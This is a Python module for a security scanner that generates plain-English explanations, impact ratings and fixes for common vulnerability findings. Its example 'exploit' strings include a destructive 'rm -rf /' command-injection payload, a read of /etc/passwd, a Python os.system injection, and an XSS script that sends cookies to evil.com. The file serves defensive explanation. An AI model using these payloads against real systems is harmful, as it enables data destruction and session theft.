"""AI Explanation Engine.

Generates natural language explanations for findings:
- Static analysis explanations (always available)
- Optional LLM-powered detailed explanations (when API key is configured)
- Exploit scenario generation
- Impact assessment in plain English
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class FindingExplanation:
    """Complete explanation for a security finding."""
    summary: str
    detailed_explanation: str
    exploit_scenario: str
    impact: str
    remediation_steps: list[str]
    learning_resources: list[str]
    confidence: float
    is_llm_generated: bool = False


CATEGORY_EXPLANATIONS = {
    "sql_injection": {
        "summary": "User-controlled input is directly interpolated into a SQL query, allowing an attacker to inject arbitrary SQL commands.",
        "detailed": (
            "This vulnerability occurs when user-supplied data is concatenated directly into a SQL query string "
            "without proper parameterization or escaping. An attacker can craft malicious input that modifies "
            "the query structure, potentially allowing them to read, modify, or delete data, or even execute "
            "administrative operations on the database."
        ),
        "exploit": (
            "An attacker could submit input like: ' OR '1'='1' --\n"
            "This would modify the WHERE clause to always be true, potentially returning all records. "
            "More advanced attacks could use UNION SELECT to extract data from other tables, "
            "or use stacked queries to execute arbitrary SQL commands."
        ),
        "impact": (
            "Confidentiality: HIGH - Attacker can read all database records\n"
            "Integrity: HIGH - Attacker can modify or delete data\n"
            "Availability: MEDIUM - Attacker could drop tables or cause DoS"
        ),
        "steps": [
            "Replace string concatenation/formatting with parameterized queries",
            "Use ORM frameworks (SQLAlchemy, Django ORM) which handle parameterization",
            "Implement input validation for expected data types and ranges",
            "Apply principle of least privilege to database accounts",
        ],
        "refs": [
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
    },
    "command_injection": {
        "summary": "User input is passed to a system command execution function, allowing an attacker to run arbitrary OS commands.",
        "detailed": (
            "This vulnerability occurs when user-supplied data is passed to operating system command execution "
            "functions like os.system(), subprocess with shell=True, or os.popen(). An attacker can inject "
            "shell metacharacters to execute arbitrary commands on the server."
        ),
        "exploit": (
            "An attacker could submit input like: ; rm -rf / || cat /etc/passwd\n"
            "The semicolon terminates the original command, and the attacker's payload executes afterward. "
            "Other metacharacters like |, &&, ||, $() can also be used to chain commands."
        ),
        "impact": (
            "Confidentiality: CRITICAL - Attacker can read any file on the system\n"
            "Integrity: CRITICAL - Attacker can modify system configuration\n"
            "Availability: CRITICAL - Attacker can shut down or destroy the server"
        ),
        "steps": [
            "Use subprocess.run() with shell=False and pass arguments as a list",
            "Validate and sanitize all input before passing to any command",
            "Implement input whitelisting for expected values",
            "Run commands with minimal system privileges",
        ],
        "refs": [
            "https://cwe.mitre.org/data/definitions/78.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        ],
    },
    "code_injection": {
        "summary": "Dynamic code execution (eval/exec) is used with potentially untrusted input.",
        "detailed": (
            "Using eval() or exec() with user-controlled input allows an attacker to execute arbitrary Python "
            "code on the server. Even with restricted builtins, attackers often find bypass techniques through "
            "object attribute traversal, import tricks, or other Python-specific attack vectors."
        ),
        "exploit": (
            "An attacker could submit: __import__('os').system('whoami')\n"
            "Or use attribute traversal: ().__class__.__bases__[0].__subclasses__()\n"
            "These techniques can bypass most restriction mechanisms and achieve full code execution."
        ),
        "impact": (
            "Confidentiality: CRITICAL - Full access to all data and files\n"
            "Integrity: CRITICAL - Can modify any code or data\n"
            "Availability: CRITICAL - Can shut down the application"
        ),
        "steps": [
            "Use ast.literal_eval() for evaluating Python literals",
            "Use json.loads() for parsing JSON data",
            "Refactor to use a safe expression evaluator (e.g., simpleeval)",
            "If dynamic execution is truly needed, use a sandboxed environment",
        ],
        "refs": [
            "https://cwe.mitre.org/data/definitions/95.html",
            "https://owasp.org/www-community/vulnerabilities/Code_Injection",
        ],
    },
    "hardcoded_secret": {
        "summary": "A secret (password, API key, token) is hardcoded in the source code.",
        "detailed": (
            "Hardcoded secrets in source code are a critical security risk. If the code is exposed through "
            "version control, backups, or decompilation, attackers can extract these credentials. Even in "
            "private repositories, secrets can leak through logs, error messages, or developer workstations."
        ),
        "exploit": (
            "An attacker with access to the source code (or a decompiled version) can simply read the secret. "
            "This could lead to unauthorized access to databases, APIs, cloud services, or other systems "
            "protected by these credentials."
        ),
        "impact": (
            "Confidentiality: HIGH - Credentials expose protected systems\n"
            "Integrity: HIGH - Attacker can perform actions as the application\n"
            "Availability: MEDIUM - Compromised credentials could be used to disrupt services"
        ),
        "steps": [
            "Move secrets to environment variables (os.environ.get())",
            "Use a secrets manager (AWS Secrets Manager, HashiCorp Vault)",
            "Add .env files to .gitignore",
            "Rotate all exposed credentials immediately",
        ],
        "refs": [
            "https://cwe.mitre.org/data/definitions/798.html",
            "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
        ],
    },
    "xss": {
        "summary": "User-controlled content is rendered without proper output encoding, enabling Cross-Site Scripting.",
        "detailed": (
            "Cross-Site Scripting (XSS) occurs when user-supplied data is included in web pages without "
            "proper output encoding. This allows attackers to inject malicious scripts that execute in "
            "the browsers of other users, potentially stealing session tokens, credentials, or performing "
            "actions on behalf of the victim."
        ),
        "exploit": (
            "An attacker could submit: <script>document.location='https://evil.com/?c='+document.cookie</script>\n"
            "When displayed to other users, this script steals their session cookies."
        ),
        "impact": (
            "Confidentiality: HIGH - Session hijacking, credential theft\n"
            "Integrity: HIGH - Actions performed as the victim\n"
            "Availability: LOW - Possible defacement"
        ),
        "steps": [
            "Use template engines with automatic escaping (Jinja2, Django templates)",
            "Set Content-Security-Policy headers",
            "Use textContent instead of innerHTML",
            "Sanitize user input with DOMPurify on the client side",
        ],
        "refs": [
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/79.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html",
        ],
    },
    "path_traversal": {
        "summary": "User input is used to construct file paths without proper validation, enabling directory traversal.",
        "detailed": (
            "Path traversal vulnerabilities allow attackers to access files outside the intended directory "
            "by using ../ sequences or other path manipulation techniques. This can expose sensitive system "
            "files, configuration files, or other application data."
        ),
        "exploit": (
            "An attacker could request: /download?file=../../../../etc/passwd\n"
            "This navigates up the directory tree to access system files."
        ),
        "impact": (
            "Confidentiality: HIGH - Can read sensitive system and application files\n"
            "Integrity: MEDIUM - In some cases, can write to arbitrary locations\n"
            "Availability: LOW - Could read large files to cause DoS"
        ),
        "steps": [
            "Validate file paths against an allowlist of permitted directories",
            "Use os.path.realpath() to resolve symlinks and check the result",
            "Use os.path.basename() to strip directory components",
            "Implement chroot or containerization to limit file system access",
        ],
        "refs": [
            "https://cwe.mitre.org/data/definitions/22.html",
            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        ],
    },
    "deserialization": {
        "summary": "Untrusted data is deserialized using an unsafe method, potentially allowing remote code execution.",
        "detailed": (
            "Unsafe deserialization allows attackers to craft malicious serialized objects that execute "
            "arbitrary code when deserialized. Python's pickle module is particularly dangerous as it "
            "can execute arbitrary code during unpickling."
        ),
        "exploit": (
            "An attacker could craft a pickle payload that executes: __import__('os').system('malicious_command')\n"
            "When deserialized with pickle.loads(), this payload executes automatically."
        ),
        "impact": (
            "Confidentiality: CRITICAL - Full system access\n"
            "Integrity: CRITICAL - Arbitrary code execution\n"
            "Availability: CRITICAL - System compromise"
        ),
        "steps": [
            "Replace pickle with json for data serialization",
            "If pickle is required, implement cryptographic signing of serialized data",
            "Validate serialized data before deserializing",
            "Use a restricted unpickler that only allows specific classes",
        ],
        "refs": [
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
        ],
    },
}


def explain_finding(
    category: str,
    title: str = "",
    description: str = "",
    file_path: str = "",
    line: int = 0,
    severity: str = "",
    confidence: float = 0.5,
    cvss_score: float = 0.0,
    code_snippet: str = "",
    cwe: str = "",
    owasp: str = "",
) -> FindingExplanation:
    """Generate a comprehensive explanation for a finding."""
    template = CATEGORY_EXPLANATIONS.get(category, CATEGORY_EXPLANATIONS.get("injection", {}))

    summary = template.get("summary", f"Potential {category} vulnerability detected.")
    detailed = template.get("detailed", f"The code at {file_path}:{line} may be vulnerable to {category}.")
    exploit = template.get("exploit", "An attacker could potentially exploit this vulnerability.")
    impact = template.get("impact", "Impact assessment requires manual review.")
    steps = template.get("steps", ["Review the code and apply security best practices."])

    if code_snippet:
        detailed += f"\n\nThe vulnerable code at line {line}:\n```\n{code_snippet[:300]}\n```"

    if severity:
        severity_text = severity.upper()
        if severity_text in ("CRITICAL", "HIGH"):
            detailed += f"\n\nThis is a {severity_text}-severity finding that should be addressed immediately."
        elif severity_text == "MEDIUM":
            detailed += f"\n\nThis is a MEDIUM-severity finding that should be addressed in the near term."

    return FindingExplanation(
        summary=summary,
        detailed_explanation=detailed,
        exploit_scenario=exploit,
        impact=impact,
        remediation_steps=steps,
        learning_resources=template.get("refs", []),
        confidence=confidence,
    )


def explain_taint_flow(
    source_name: str,
    source_type: str,
    sink_name: str,
    sink_type: str,
    variable_chain: list[str],
    is_sanitized: bool,
    sanitizer: str = "",
) -> str:
    """Generate explanation for a taint flow path."""
    parts = [
        f"Untrusted data enters the application through **{source_name}** ({source_type}).",
        f"The data flows through variables: {' → '.join(variable_chain)}",
        f"and reaches the dangerous sink **{sink_name}** ({sink_type}).",
    ]

    if is_sanitized:
        parts.append(
            f"\nThe data is sanitized using **{sanitizer}** before reaching the sink, "
            "which may reduce or eliminate the risk."
        )
    else:
        parts.append(
            "\n**No sanitization was detected** between the source and sink. "
            "This significantly increases the risk of exploitation."
        )

    return " ".join(parts)


def get_severity_explanation(severity: str, confidence: float) -> str:
    """Get a human-readable explanation of the severity and confidence."""
    sev = severity.upper()
    if sev == "CRITICAL":
        base = "This is a critical vulnerability that could lead to complete system compromise."
    elif sev == "HIGH":
        base = "This is a high-severity vulnerability that could lead to significant data exposure or system damage."
    elif sev == "MEDIUM":
        base = "This is a medium-severity vulnerability that could be exploited under certain conditions."
    elif sev == "LOW":
        base = "This is a low-severity vulnerability with limited impact."
    else:
        base = "This is an informational finding that may not represent a direct vulnerability."

    if confidence >= 0.8:
        conf = "Our analysis has high confidence that this finding represents a real vulnerability."
    elif confidence >= 0.5:
        conf = "Our analysis has moderate confidence. Manual verification is recommended."
    else:
        conf = "Our analysis has low confidence. This may be a false positive."

    return f"{base} {conf}"
